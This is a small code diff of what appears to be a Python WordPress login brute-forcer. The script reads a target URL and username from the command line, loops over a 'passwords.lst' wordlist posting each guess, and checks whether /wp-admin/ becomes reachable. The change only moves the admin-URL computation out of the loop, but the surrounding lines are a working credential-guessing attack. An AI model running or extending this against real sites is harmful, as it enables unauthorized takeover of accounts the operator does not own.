@@ -28,6 +28,9 @@ if len(sys.argv) == 3:
 print(str(sys.argv))
 print("URL: " + url)
 print("login: " + log)
+dns = (url.split("/"))[2]
+protocol = url.split("/")[0]
+wp_admin_url =  protocol + "//" +  dns + "/wp-admin/"
 
 with open("passwords.lst", 'r') as f:
     passwords = f.read().rsplit('\n')
@@ -40,9 +43,6 @@ for password in passwords:
      
     with  requests.Session() as s:
         s.post(url, data=data)
-        dns = (url.split("/"))[2]
-        protocol = url.split("/")[0]
-        wp_admin_url =  protocol + "//" +  dns + "/wp-admin/"
         response = s.get(wp_admin_url)
             
     if response is not None:
